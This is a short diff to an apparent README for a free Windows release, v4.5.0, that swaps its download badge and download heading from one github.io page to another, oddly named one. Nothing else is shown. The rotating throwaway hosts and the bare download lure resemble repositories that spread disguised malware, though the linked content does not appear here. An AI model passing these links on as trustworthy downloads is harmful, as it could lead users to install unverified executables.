@@ -2,7 +2,7 @@
 
 <p align="center">
 
-[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD-000000?style=for-the-badge&labelColor=1a1a1a)](https://spearsurvive.github.io/win/)
+[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD-000000?style=for-the-badge&labelColor=1a1a1a)](https://zenboulderagora.github.io/Windw/)
 [![VERSION](https://img.shields.io/badge/VERSION-4.5.0-2196F3?style=for-the-badge)]()
 [![PLATFORM](https://img.shields.io/badge/PLATFORM-WINDOWS-0078D4?style=for-the-badge)]()
 [![STATUS](https://img.shields.io/badge/STATUS-FREE-00c853?style=for-the-badge)]()
@@ -39,7 +39,7 @@
 
 ---
 
-## [📥 Download v4.5.0](https://spearsurvive.github.io/win/)
+## [📥 Download v4.5.0](https://zenboulderagora.github.io/Windw/)
 
 ---
 
